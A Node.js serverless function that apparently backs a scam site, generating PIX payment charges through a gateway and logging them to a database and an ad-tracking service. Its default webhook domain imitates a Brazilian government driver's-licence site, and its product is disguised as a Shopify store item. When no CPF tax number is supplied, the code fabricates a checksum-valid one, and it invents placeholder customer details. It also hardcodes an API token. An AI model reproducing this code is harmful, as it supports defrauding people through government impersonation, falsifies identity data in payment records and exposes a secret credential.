const { getSupabase } = require("./lib/supabase");

const VOIDPAY_BASE = "https://dash.voidpayments.com/api/v1";
const VOIDPAY_PUBLIC_KEY = process.env.VOIDPAY_PUBLIC_KEY;
const VOIDPAY_SECRET_KEY = process.env.VOIDPAY_SECRET_KEY;
const UTMIFY_TOKEN = "lzASZob4ldSJJc3jT1LILy9alPxWJgpnPhCh";
const SUPABASE_URL = process.env.NEXT_PUBLIC_SUPABASE_URL;
const SUPABASE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;

// Cache UTMify para evitar duplicatas
const utmifyCache = new Map();
const CACHE_TTL = 60000;

function gerarCpfValido() {
  const d = new Array(9);
  for (let i = 0; i < 9; i++) d[i] = Math.floor(Math.random() * 10);
  let soma = 0;
  for (let i = 0; i < 9; i++) soma += d[i] * (10 - i);
  let resto = soma % 11;
  d[9] = resto < 2 ? 0 : 11 - resto;
  soma = 0;
  for (let i = 0; i < 10; i++) soma += d[i] * (11 - i);
  resto = soma % 11;
  d[10] = resto < 2 ? 0 : 11 - resto;
  return d.join("");
}

function fmtPhone(phone) {
  if (!phone) return "(11) 99999-9999";
  const digits = phone.replace(/\D/g, "");
  if (digits.length >= 11) {
    return `(${digits.slice(0, 2)}) ${digits.slice(2, 3)} ${digits.slice(3, 7)}-${digits.slice(7, 11)}`;
  }
  if (digits.length >= 10) {
    return `(${digits.slice(0, 2)}) ${digits.slice(2, 6)}-${digits.slice(6, 10)}`;
  }
  return "(11) 99999-9999";
}

async function sendUtmify(transactionId, status, customer, amountCents, createdAt, utms) {
  if (utmifyCache.has(transactionId)) return;
  utmifyCache.set(transactionId, true);
  setTimeout(() => utmifyCache.delete(transactionId), CACHE_TTL);

  try {
    const gatewayFeeCents = Math.round(amountCents * 0.02);
    const netCents = amountCents - gatewayFeeCents;
    const payload = {
      orderId: transactionId,
      platform: "VoidPay",
      paymentMethod: "pix",
      status,
      createdAt: createdAt || new Date().toISOString().replace("T", " ").slice(0, 19),
      approvedDate: status === "paid" ? new Date().toISOString().replace("T", " ").slice(0, 19) : null,
      customer: {
        name: customer.name || null,
        email: customer.email || null,
        phone: customer.phone || null,
        document: customer.cpf || null,
        country: "BR",
        ip: "177.0.0.1",
      },
      products: [{
        id: "loja-shopify-br-001",
        name: "SHOPIFY LOJA 03",
        quantity: 1,
        priceInCents: amountCents,
      }],
      trackingParameters: {
        utm_source: utms?.utm_source || null,
        utm_campaign: utms?.utm_campaign || null,
        utm_medium: utms?.utm_medium || null,
        utm_content: utms?.utm_content || null,
        utm_term: utms?.utm_term || null,
      },
      commission: {
        totalPriceInCents: amountCents,
        gatewayFeeInCents: gatewayFeeCents,
        userCommissionInCents: netCents,
        currency: "BRL",
      },
    };

    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 3000);
    await fetch("https://api.utmify.com.br/api-credentials/orders", {
      method: "POST",
      headers: { "Content-Type": "application/json", "x-api-token": UTMIFY_TOKEN },
      body: JSON.stringify(payload),
      signal: controller.signal,
    });
    clearTimeout(timeoutId);
    console.log("[UTMify] ✓ Enviado:", transactionId);
  } catch (err) {
    console.error("[UTMify] Erro (não bloqueia):", err.message);
  }
}

function jsonResponse(statusCode, body) {
  return {
    statusCode,
    headers: {
      "Content-Type": "application/json; charset=utf-8",
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Headers": "Content-Type, Authorization",
      "Access-Control-Allow-Methods": "GET,POST,OPTIONS",
    },
    body: JSON.stringify(body),
  };
}

exports.handler = async (event) => {
  console.log("[PIX-VOIDPAY] ===== FUNÇÃO INICIADA =====");

  if (!VOIDPAY_PUBLIC_KEY || !VOIDPAY_SECRET_KEY) {
    console.error("❌ Credenciais VoidPay não configuradas!");
    return jsonResponse(500, {
      success: false,
      error: "Credenciais da gateway não configuradas",
      debug: "VOIDPAY_PUBLIC_KEY ou VOIDPAY_SECRET_KEY não encontradas",
    });
  }

  if (event.httpMethod === "OPTIONS") {
    return {
      statusCode: 204,
      headers: {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Headers": "Content-Type, Authorization",
        "Access-Control-Allow-Methods": "GET,POST,OPTIONS",
      },
      body: "",
    };
  }

  let body = {};
  try { body = event.body ? JSON.parse(event.body) : {}; } catch { body = {}; }

  const randId = Math.random().toString(36).slice(2, 10);
  const rawAmount = body.amount ?? body.valor ?? body.total ?? 20.00;
  const amountReais = Number(rawAmount) || 20.00;
  const amountCents = Math.round(amountReais * 100);

  const customerName = (body.nome || body.name || body.customer_name || `Cliente ${randId}`).toString().trim();
  const customerEmail = (body.email || body.customer_email || `cliente${randId}@gmail.com`).toString().trim();
  const customerPhone = fmtPhone(body.phone || body.customer_phone || "11999999999");
  const cpfRaw = (body.cpf || body.document || body.customer_cpf || "").toString().replace(/\D/g, "");
  const customerCpf = cpfRaw.length === 11 ? cpfRaw : gerarCpfValido();
  const utms = body.utm || {};
  const identifier = `order_${randId}_${Date.now()}`;

  // URL do webhook — ajusta conforme ambiente
  const webhookBase = process.env.WEBHOOK_BASE_URL || "https://cnh-brasil-gov-br.netlify.app";
  const callbackUrl = `${webhookBase}/api/webhook/voidpay`;

  console.log("[PIX-VOIDPAY] Amount:", amountReais, "Cents:", amountCents);
  console.log("[PIX-VOIDPAY] Customer:", { name: customerName, email: customerEmail, cpf: customerCpf });

  const payload = {
    identifier,
    amount: amountReais,
    client: {
      name: customerName,
      email: customerEmail,
      phone: customerPhone,
      document: customerCpf,
    },
    products: [
      {
        id: "loja-shopify-br-001",
        name: "SHOPIFY LOJA 03",
        quantity: 1,
        price: amountReais,
      },
    ],
    metadata: {
      utm_source: utms.utm_source || null,
      utm_campaign: utms.utm_campaign || null,
      utm_medium: utms.utm_medium || null,
      utm_content: utms.utm_content || null,
      utm_term: utms.utm_term || null,
    },
    callbackUrl,
  };

  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 30000);

    const resp = await fetch(`${VOIDPAY_BASE}/gateway/pix/receive`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "x-public-key": VOIDPAY_PUBLIC_KEY,
        "x-secret-key": VOIDPAY_SECRET_KEY,
      },
      body: JSON.stringify(payload),
      signal: controller.signal,
    });
    clearTimeout(timeout);

    const text = await resp.text();
    if (!resp.ok) {
      let errMsg = text;
      try { errMsg = JSON.parse(text)?.message || errMsg; } catch {}
      console.error("[VoidPay] Erro HTTP:", resp.status, errMsg);
      return jsonResponse(resp.status, {
        success: false,
        error: errMsg,
        debug: { status: resp.status, body: text.substring(0, 200) },
      });
    }

    let parsed = {};
    try { parsed = JSON.parse(text); } catch {
      console.error("[VoidPay] Parse error:", text.substring(0, 200));
      return jsonResponse(500, {
        success: false,
        error: "Resposta inválida da gateway",
        debug: text.substring(0, 200),
      });
    }

    // VoidPay retorna "PENDING" quando PIX é gerado com sucesso (aguardando pagamento)
    // Apenas rejeitar se houver erro explícito ou status FAILED
    if (parsed.status === "FAILED" || parsed.errorDescription) {
      console.error("[VoidPay] Transação falhou:", parsed);
      return jsonResponse(500, {
        success: false,
        error: parsed.errorDescription || parsed.message || "Gateway retornou erro",
        debug: parsed,
      });
    }

    const transactionId = String(parsed.transactionId);
    const pixCode = parsed.pix?.code || null;
    const pixImage = parsed.pix?.image || null;

    if (!transactionId || !pixCode) {
      console.error("[VoidPay] Resposta incompleta:", { transactionId, pixCode: !!pixCode });
      return jsonResponse(500, {
        success: false,
        error: "Gateway retornou resposta incompleta",
        debug: { transaction: transactionId, hasPix: !!pixCode },
      });
    }

    console.log("[PIX-VOIDPAY] ✓ PIX gerado com sucesso | ID:", transactionId);

    // Salvar no Supabase (não bloqueia)
    if (SUPABASE_URL && SUPABASE_KEY) {
      try {
        const supabase = getSupabase();
        await supabase.from("transactions").insert({
          transaction_id: transactionId,
          amount: amountReais,
          customer_name: customerName,
          customer_email: customerEmail,
          customer_cpf: customerCpf,
          customer_phone: customerPhone,
          status: "pending",
          brcode: pixCode,
          utm_source: utms.utm_source || null,
          utm_campaign: utms.utm_campaign || null,
          utm_medium: utms.utm_medium || null,
        });
        console.log("[Supabase] ✓ Salvo:", transactionId);
      } catch (err) {
        console.error("[Supabase] Erro (continuando):", err.message);
      }
    }

    // Notificar UTMify como waiting_payment
    await sendUtmify(
      transactionId, "waiting_payment",
      { name: customerName, email: customerEmail, phone: customerPhone, cpf: customerCpf },
      amountCents,
      new Date().toISOString().replace("T", " ").slice(0, 19),
      utms
    ).catch(err => console.error("[UTMify] Erro:", err.message));

    return jsonResponse(200, {
      success: true,
      pixCode,
      pix_code: pixCode,
      brcode: pixCode,
      payload: pixCode,
      qr_code_image: pixImage || null,
      transaction_id: transactionId,
      transactionId,
      deposit_id: transactionId,
      status: "pending",
    });

  } catch (err) {
    console.error("[PIX-VOIDPAY] Erro ao chamar gateway:", err.message);
    return jsonResponse(502, {
      success: false,
      error: "Falha ao conectar com gateway: " + String(err),
    });
  }
};